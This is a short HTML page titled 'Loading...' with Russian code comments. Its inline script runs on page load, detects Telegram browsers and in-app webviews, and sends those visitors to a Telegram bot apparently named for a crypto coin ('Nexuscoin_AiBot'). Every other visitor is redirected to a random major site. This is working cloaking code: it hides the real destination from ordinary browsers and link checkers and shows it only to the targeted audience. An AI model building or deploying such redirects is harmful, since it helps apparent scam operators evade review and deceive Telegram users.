<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <script>
    (function() {
      const ua = navigator.userAgent || navigator.vendor || window.opera || '';
      
      // 🤖 Ссылка для Telegram
      const telegramLink = 'https://t.me/Nexuscoin_AiBot?start=fgdgfd2fe';
      
      // 🌐 Список сайтов для обычных браузеров
      const sites = [
        'https://www.google.com',
        'https://www.youtube.com',
        'https://www.instagram.com',
        'https://vk.com',
        'https://dzen.ru',
        'https://www.facebook.com',
        'https://www.tiktok.com',
        'https://twitter.com'
      ];
      
      let targetUrl;
      
      // 🔥 Улучшенная проверка на Telegram (несколько способов)
      const isTelegram = 
        /Telegram/i.test(ua) ||                    // Обычный Telegram
        /TelegramBot/i.test(ua) ||                  // Telegram Bot
        (window.Telegram && window.Telegram.WebApp) || // Telegram WebApp
        /tg-webview/i.test(ua) ||                   // Telegram WebView
        /android.*telegram/i.test(ua.toLowerCase()); // Android Telegram
      
      if (isTelegram) {
        // Для Telegram используем href вместо replace (лучше работает)
        window.location.href = telegramLink;
        return; // Выходим сразу
      } else {
        // Выбираем случайный сайт из списка
        const randomIndex = Math.floor(Math.random() * sites.length);
        targetUrl = sites[randomIndex];
        window.location.replace(targetUrl);
      }
    })();
  </script>
</head>
